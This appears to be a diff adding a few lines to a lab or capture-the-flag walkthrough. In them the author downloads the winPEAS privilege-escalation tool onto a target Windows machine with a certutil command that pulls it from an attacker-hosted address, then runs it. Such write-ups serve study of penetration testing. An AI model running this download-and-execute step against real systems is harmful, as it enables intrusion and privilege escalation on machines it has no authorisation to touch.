@@ -25,3 +25,14 @@ On the target machine I go to a location that is writable like in the `butler` d
 
 ![](attachments/Pasted%20image%2020251126225052.png)
 
+and I get the `winpeas` with this command:
+```cmd
+certutil.exe -urlcache -f http://192.168.126.129/winPEASx64.exe winPEASx64.exe
+```
+
+![](attachments/Pasted%20image%2020251126225426.png)
+
+and then I run it:
+
+![](attachments/Pasted%20image%2020251126225511.png)
+
